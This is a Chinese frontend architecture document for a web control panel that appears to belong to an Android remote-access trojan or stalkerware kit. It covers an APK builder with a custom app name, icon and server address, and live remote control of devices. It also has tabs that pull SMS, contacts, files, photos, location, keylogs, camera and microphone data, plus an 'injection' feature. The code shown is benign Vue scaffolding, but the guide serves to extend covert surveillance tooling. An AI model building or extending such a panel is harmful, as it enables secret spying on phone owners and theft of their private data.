# 前端架构文档

> Vue 3 + Inertia.js + Naive UI 前端技术栈详解

## 技术栈

| 技术 | 版本 | 用途 |
|------|------|------|
| Vue 3 | 3.5 | 前端框架 |
| Inertia.js | 2.x | SPA 路由桥接 |
| Naive UI | 2.43 | UI 组件库 |
| TypeScript | 5.x | 类型安全 |
| Vite | 7.x | 构建工具 |
| Tailwind CSS | 4.x | 原子化 CSS |

## 目录结构

```
app/resources/ts/
├── app.ts                    # 应用入口
├── env.d.ts                  # 环境变量类型
├── shims-vue.d.ts            # Vue 类型声明
├── Layouts/                  # 布局组件
│   ├── AuthenticatedLayout.vue   # 已认证用户布局
│   └── DefaultLayout.vue         # 默认布局 (登录页等)
├── Pages/                    # 页面组件
│   ├── Auth/                 # 认证相关
│   ├── Dashboard/            # 控制台
│   ├── Devices/              # 设备管理
│   ├── Builds/               # APK 构建
│   ├── Settings/             # 用户设置
│   └── Welcome.vue           # 欢迎页
├── Components/               # 可复用组件
│   └── DeviceControl/        # 设备控制组件
├── composables/              # Vue Composables
│   ├── useGlobalWebSocket.ts     # 全局 WebSocket
│   ├── useDeviceWebSocket.ts     # 设备 WebSocket
│   └── useScreenControl.ts       # 屏幕控制
└── types/                    # TypeScript 类型
    ├── index.ts              # 通用类型
    ├── device.ts             # 设备类型
    └── websocket.ts          # WebSocket 消息类型
```

---

## 入口文件

### `app.ts`

应用入口，配置 Inertia.js 和 Naive UI 全局 Provider：

```typescript
createInertiaApp({
    title: (title) => `${title} - 飞鹰管理系统`,
    resolve: (name) => resolvePageComponent(`./Pages/${name}.vue`, ...),
    setup({ el, App, props, plugin }) {
        createApp({
            render: () => h(NConfigProvider, { locale: zhCN }, () =>
                h(NLoadingBarProvider, null, () =>
                    h(NDialogProvider, null, () =>
                        h(NNotificationProvider, null, () =>
                            h(NMessageProvider, null, () => h(App, props))
                        )
                    )
                )
            ),
        }).use(plugin).mount(el);
    },
});
```

**关键配置：**
- 中文语言包 (`zhCN`, `dateZhCN`)
- 全局 Provider 嵌套顺序
- 页面标题格式

---

## 布局组件

### `AuthenticatedLayout.vue`

已登录用户的主布局，包含：

| 功能 | 说明 |
|------|------|
| 侧边栏导航 | 控制台、设备管理、APK 构建、设置 |
| 用户菜单 | 个人资料、退出登录 |
| WebSocket 连接 | 自动连接全局 WebSocket |
| 响应式折叠 | 侧边栏可折叠 |

**导航菜单：**
```typescript
const menuOptions = [
    { label: '控制台', key: 'dashboard', icon: HomeOutline },
    { label: '设备管理', key: 'devices', icon: PhonePortraitOutline },
    { label: 'APK 构建', key: 'builds', icon: CloudDownloadOutline },
    { label: '设置', key: 'settings', icon: SettingsOutline },
];
```

### `DefaultLayout.vue`

未登录用户的布局，用于登录/注册页面，简洁无侧边栏。

---

## 页面组件

### 认证模块 (`Pages/Auth/`)

| 页面 | 路由 | 功能 |
|------|------|------|
| `Login.vue` | `/login` | 用户登录表单 |
| `Register.vue` | `/register` | 用户注册表单 |

**特点：**
- 使用 `useForm` 处理表单提交
- 密码显示/隐藏切换
- 背景装饰动画

### 控制台 (`Pages/Dashboard/`)

| 页面 | 路由 | 功能 |
|------|------|------|
| `Index.vue` | `/dashboard` | 数据统计概览 |

**统计卡片：**
- 设备总数
- 在线设备数 (带进度条)
- APK 构建数
- 构建成功率

### 设备管理 (`Pages/Devices/`)

| 页面 | 路由 | 功能 |
|------|------|------|
| `Index.vue` | `/devices` | 设备列表 (表格) |
| `Show.vue` | `/devices/{uuid}` | 设备详情 |
| `Control.vue` | `/devices/{uuid}/control` | 设备远程控制 |

#### `Index.vue` - 设备列表

**表格列：**
| 列 | 说明 |
|---|------|
| 设备 | 头像 + 名称 + 型号 |
| Android | 系统版本 |
| 状态 | 在线/离线 (带状态点) |
| 电量 | 电池图标 + 百分比 |
| 网络 | WiFi/4G/5G 图标 |
| 无障碍 | 开启/关闭状态 |
| 活动时间 | 相对时间显示 |
| 操作 | 查看/删除按钮 |

**功能：**
- 实时 WebSocket 状态更新
- 搜索过滤 (名称/型号/UUID)
- 状态筛选 (全部/在线/离线)
- 分页支持

#### `Control.vue` - 设备控制

**功能模块：**
- 实时投屏/截屏
- OCR 文字识别
- 触摸操作 (点击/滑动/长按)
- 设备操作 (音量/锁屏/返回等)
- 文字粘贴

### APK 构建 (`Pages/Builds/`)

| 页面 | 路由 | 功能 |
|------|------|------|
| `Index.vue` | `/builds` | 构建列表 |
| `Create.vue` | `/builds/create` | 创建新构建 |
| `Show.vue` | `/builds/{id}` | 构建详情 |
| `Download.vue` | `/builds/{id}/download` | APK 下载页 |

#### `Create.vue` - 创建构建

**表单字段：**
| 字段 | 说明 |
|------|------|
| 模板选择 | 预设模板或自定义 |
| 应用名称 | APK 显示名称 |
| 包名 | Android 包名 |
| 版本号 | 应用版本 |
| 服务器地址 | WebSocket 服务器 |
| WSS 加密 | 是否启用 SSL |
| 图标/背景 | 自定义图片 |

**构建流程：**
1. 表单验证
2. SSE 实时进度推送
3. 步骤状态显示 (等待/进行中/完成/失败)
4. 构建完成跳转

#### `Show.vue` - 构建详情

**显示内容：**
- 应用基本信息 (名称/包名/版本)
- 构建参数列表
- 构建时间线
- 下载二维码
- 操作按钮 (下载/分享/删除)

### 用户设置 (`Pages/Settings/`)

| 页面 | 路由 | 功能 |
|------|------|------|
| `Profile.vue` | `/settings/profile` | 个人资料设置 |

**功能：**
- 修改用户名/邮箱/联系方式
- 修改密码 (当前密码验证)
- 订阅信息展示

---

## 组件库

### 设备控制组件 (`Components/DeviceControl/`)

| 组件 | 功能 |
|------|------|
| `TextAssistPanel.vue` | OCR 文字辅助面板 |
| `DeviceInfo.vue` | 设备信息卡片 |
| `DeviceActions.vue` | 设备操作按钮组 |
| `QuickActionToolbar.vue` | 快捷操作工具栏 |
| `MediaPanel.vue` | 媒体预览面板 |
| `PasswordInfo.vue` | 密码信息展示 |
| `LoadingSkeleton.vue` | 加载骨架屏 |

### Tab 组件 (`Components/DeviceControl/tabs/`)

| 组件 | 功能 |
|------|------|
| `SmsTab.vue` | 短信列表 |
| `ContactsTab.vue` | 联系人列表 |
| `AppsTab.vue` | 应用列表 |
| `FilesTab.vue` | 文件管理 |
| `GalleryTab.vue` | 相册浏览 |
| `LocationTab.vue` | 位置信息 |
| `KeylogTab.vue` | 键盘日志 |
| `CameraTab.vue` | 相机控制 |
| `MicTab.vue` | 麦克风录音 |
| `InjectTab.vue` | 注入功能 |

---

## Composables

### `useGlobalWebSocket.ts`

全局 WebSocket 连接管理，用于设备列表页面的实时状态更新。

**导出：**
```typescript
export function useGlobalWebSocket() {
    return {
        connectionState,    // 连接状态
        lastError,          // 错误信息
        stats,              // 设备统计 { total, online, offline }
        isConnected,        // 是否已连接
        connect,            // 连接方法
        disconnect,         // 断开方法
        send,               // 发送消息
        onMessage,          // 消息监听
    };
}
```

**特性：**
- 单例模式 (全局共享连接)
- 自动重连 (指数退避)
- 心跳保活 (30秒间隔)
- 订阅机制 (按用户邮箱)

### `useDeviceWebSocket.ts`

设备控制页面的 WebSocket 连接，用于单设备实时通信。

**导出：**
```typescript
export function useDeviceWebSocket() {
    return {
        connectionState,    // 连接状态
        lastError,          // 错误信息
        deviceStatus,       // 设备状态
        isDeviceOnline,     // 设备是否在线
        connect,            // 连接方法 (deviceId, usercheck)
        disconnect,         // 断开方法
        send,               // 发送消息
        onMessage,          // 消息监听
    };
}
```

**特性：**
- 实例模式 (每个设备独立连接)
- Join/Ping/Out 消息协议
- 设备状态解析
- 5秒心跳间隔

### `useScreenControl.ts`

屏幕控制功能封装。

**导出方法：**
| 方法 | 功能 |
|------|------|
| `startScreenShare()` | 开始投屏 |
| `stopScreenShare()` | 停止投屏 |
| `startScreenshot()` | 开始截屏 |
| `stopScreenshot()` | 停止截屏 |
| `startOCR()` | 开始 OCR |
| `stopOCR()` | 停止 OCR |
| `tap(x, y)` | 点击操作 |
| `swipe(...)` | 滑动操作 |
| `longPress(x, y)` | 长按操作 |
| `inputText(text)` | 输入文字 |
| `pressKey(keyCode)` | 按键操作 |

---

## 类型定义

### `websocket.ts`

WebSocket 消息类型定义，包含：

**出站消息 (发送到服务器)：**
- `JoinMessage` - 加入设备控制
- `PingMessage` - 心跳消息
- `OutMessage` - 退出控制
- `ScreenControlMessage` - 屏幕控制
- `DataRequestMessage` - 数据请求

**入站消息 (从服务器接收)：**
- `StatusBatchMessage` - 设备状态批量更新
- `DeviceOnlineMessage` - 设备上线通知
- `DeviceOfflineMessage` - 设备下线通知
- `ScreenDataMessage` - 屏幕数据 (base64)
- `SmsMessage` - 短信数据
- `ContactsMessage` - 联系人数据
- `AppsMessage` - 应用列表
- `FilesMessage` - 文件列表
- `KeylogMessage` - 键盘日志
- `LocationMessage` - 位置信息
- `CameraMessage` - 相机数据
- `MicMessage` - 麦克风数据

### `device.ts`

设备相关类型定义。

---

## 开发指南

### 添加新页面

1. 在 `Pages/` 下创建 `.vue` 文件
2. 使用 `AuthenticatedLayout` 或 `DefaultLayout`
3. 在 Laravel 路由中注册 Inertia 渲染

```vue
<script setup lang="ts">
import { Head } from '@inertiajs/vue3';
import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout.vue';

interface Props {
    // 从后端传入的数据
}

const props = defineProps<Props>();
</script>

<template>
    <Head title="页面标题" />
    <AuthenticatedLayout>
        <template #header-title>页面标题</template>
        <!-- 页面内容 -->
    </AuthenticatedLayout>
</template>
```

### 使用 WebSocket

```typescript
import { useGlobalWebSocket } from '@/composables/useGlobalWebSocket';

const { connectionState, onMessage, send } = useGlobalWebSocket();

// 监听消息
onMessage((msg) => {
    if (msg.type === 'deviceOnline') {
        // 处理设备上线
    }
});

// 发送消息
send({ subc: 'ping' });
```

### 表单处理

```typescript
import { useForm } from '@inertiajs/vue3';

const form = useForm({
    name: '',
    email: '',
});

const submit = () => {
    form.post('/api/endpoint', {
        onSuccess: () => { /* 成功回调 */ },
        onError: () => { /* 错误回调 */ },
    });
};
```

### 组件规范

- 使用 `<script setup lang="ts">` 语法
- Props 使用 `defineProps<T>()` 类型定义
- Emits 使用 `defineEmits<T>()` 类型定义
- 优先使用 Naive UI 组件
- 图标使用 `@vicons/ionicons5`

---

## 样式规范

### 颜色变量

| 用途 | 颜色 |
|------|------|
| 主色 (成功/在线) | `#10B981` |
| 信息/链接 | `#3B82F6` |
| 警告 | `#F59E0B` |
| 错误/危险 | `#EF4444` |
| 紫色强调 | `#8B5CF6` |
| 文字主色 | `#1e293b` |
| 文字次色 | `#64748b` |
| 文字弱色 | `#94a3b8` |
| 边框色 | `#e2e8f0` |
| 背景色 | `#f8fafc` |

### 圆角规范

| 元素 | 圆角 |
|------|------|
| 卡片 | `14px - 20px` |
| 按钮 | `10px - 12px` |
| 输入框 | `10px` |
| 标签 | `20px` (round) |
| 头像 | `10px - 14px` |

### 响应式断点

```css
@media (max-width: 1024px) { /* 平板 */ }
@media (max-width: 768px) { /* 手机 */ }
```
